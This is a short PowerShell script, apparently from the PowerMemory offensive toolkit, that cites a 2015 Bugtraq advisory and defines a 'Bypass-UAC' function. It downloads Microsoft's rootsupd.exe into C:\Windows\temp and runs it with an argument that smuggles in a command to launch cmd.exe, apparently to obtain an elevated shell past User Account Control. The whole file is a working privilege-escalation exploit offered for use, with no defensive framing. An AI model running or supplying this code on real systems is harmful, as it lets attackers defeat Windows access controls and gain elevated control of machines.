# http://seclists.org/bugtraq/2015/Sep/24
function Bypass-UAC () {      
    $fileToDownload = "http://download.microsoft.com/download/1/F/F/1FF5FEA9-C0F4-4B66-9373-278142683592/rootsupd.exe" 
    $fileDownloaded = "C:\Windows\temp\rootsupd.exe" 
     
    $webClient = new-object System.Net.WebClient 
    $webClient.DownloadFile($fileToDownload, $fileDownloaded) 
    
    $ok = "D:\GitRepo\PowerMemory\EYLR\rvkroots.exe"
      
    &$fileDownloaded "/C:c:\windows\system32\cmd.exe /K Title Follow The White Rabbit ;-)" 
}